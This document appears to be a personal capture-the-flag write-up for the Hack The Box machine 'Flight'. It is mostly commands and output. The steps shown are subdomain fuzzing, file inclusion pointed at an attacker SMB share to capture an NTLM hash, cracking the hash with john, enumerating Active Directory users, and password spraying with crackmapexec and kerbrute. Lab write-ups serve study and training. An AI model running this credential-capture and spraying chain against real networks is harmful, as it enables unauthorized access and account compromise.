* https://rootjaxk.github.io/posts/Flight/

# I read the writeup before doing the box
So, I kind of remerber the very start

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://$IP -H 'Host: FUZZ.flight.htb' -fw 1546

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 158ms]
```

* `C:\windows\system32\drivers\etc\hosts`
* `c:/windows/system32/dirvers/etc/hosts`
* and nc listener worked. Unfortunately, its the text of the file, not processed as PHP. The source must be using `file_get_contents` to load the contents, not `include`.
* `http://school.flight.htb/index.php?view=//10.10.16.2/as`

```bash
sudo responder -I tun0
Or
impacket-smbserver as . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.56.122,54136)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:b628bb1102f62bfa5e3fcab65df46e20:010100000000000080a66a7a592dda018cf9e7dc35b108d900000000010010007500500067004a0057007a0063007500030010007500500067004a0057007a0063007500020010006e006900750048006900410046004e00040010006e006900750048006900410046004e000700080080a66a7a592dda010600040002000000080030003000000000000000000000000030000075261d057ff0f7e9c43f561429a3abc8f58ee7b3a6e0c7317cc9955fa53463d00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000

john --wordlist=/usr/share/wordlists/rockyou.txt svc_apache.hash

S@Ss!K@*t13      (svc_apache)     

crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13'
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 

crackmapexec winrm flight.htb -u svc_apache -p 'S@Ss!K@*t13'
SMB         flight.htb      5985   G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb)
HTTP        flight.htb      5985   G0               [*] http://flight.htb:5985/wsman
WINRM       flight.htb      5985   G0               [-] flight.htb\svc_apache:S@Ss!K@*t13

export IP=10.129.56.122
smbclient -L $IP -U=svc_apache%'S@Ss!K@*t13'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
        Web             Disk      
```

crackmapexec shows the shares, including the standard administrative shares (ADMIN$, C$, and IPC$), the standard shares for a Windows DC (NETLOGON and SYSVOL), and three nonstandard shares (Shared, Users, and Web).

# Auth as S.Moon
## Password Spray
since I saw there is another user `C.BUM`
### Build a user list. SO many ways
1. crackmapexec

```bash
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ            
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ            
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users > crackmapexec.users
```

2. Impacket GetADUsers
```bash
impacket-GetADUsers -all -dc-ip flight.htb flight.htb/svc_apache:'S@Ss!K@*t13' | cut -d " " -f 1 | grep -Ev 'Name|Impacket|\-\-|\[' > impacket.users
```

3. Impacket lookupsid
It is okish but much slower than the others
```bash
impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee lookupsid.users
```

4. rpcclient
```bash
rpcclient --user=svc_apache%'S@Ss!K@*t13' $IP
rpcclient $> enumdomains
name:[flight] idx:[0x0]
name:[Builtin] idx:[0x0]
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[S.Moon] rid:[0x642]
user:[R.Cold] rid:[0x643]
user:[G.Lors] rid:[0x644]
user:[L.Kein] rid:[0x645]
user:[M.Gold] rid:[0x646]
user:[C.Bum] rid:[0x647]
user:[W.Walker] rid:[0x648]
user:[I.Francis] rid:[0x649]
user:[D.Truff] rid:[0x64a]
user:[V.Stevens] rid:[0x64b]
user:[svc_apache] rid:[0x64c]
user:[O.Possum] rid:[0x64d]
```

5. windpsearch
Downside is the weird naming convention
```bash
/home/alvin/Tools/Windows/AD/windapsearch/windapsearch.py -d flight.htb -u 'flight\svc_apache' -p 'S@Ss!K@*t13' --dc-ip $IP --full -U | grep sAMAccountName | cut -d' ' -f 2 > windsearch.users
```

6. ldapsearch
Similar to windpsearch, but it found `G0$` just like lookupsid
```bash
ldapsearch -H ldap://flight.htb -x -b "dc=flight,dc=htb" -D "flight\svc_apache" -w 'S@Ss!K@*t13' -s sub "(&(objectClass=user))" | grep sAMAccountName | cut -d' ' -f 2 > ldapsearch.users
```

### Spray
##### crackmapexec
```bash
crackmapexec smb flight.htb -u ldapsearch.users -p 'S@Ss!K@*t13' --continue-on-success
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
```

##### Kerbrute
```bash
 ~/kerbrute/kerbrute-arm64 passwordspray -d flight.htb --dc $IP ldapsearch.users 'S@Ss!K@*t13'

2023/12/13 18:29:02 >  Using KDC(s):
2023/12/13 18:29:02 >   10.129.56.122:88

2023/12/13 18:29:03 >  [+] VALID LOGIN WITH ERROR:       S.Moon@flight.htb:S@Ss!K@*t13   (Clock skew is too great)
2023/12/13 18:29:03 >  [+] VALID LOGIN WITH ERROR:       svc_apache@flight.htb:S@Ss!K@*t13       (Clock skew is too great)
```

Weird thing is that my `~/go/bin/kerbrute` doesn't work for it.

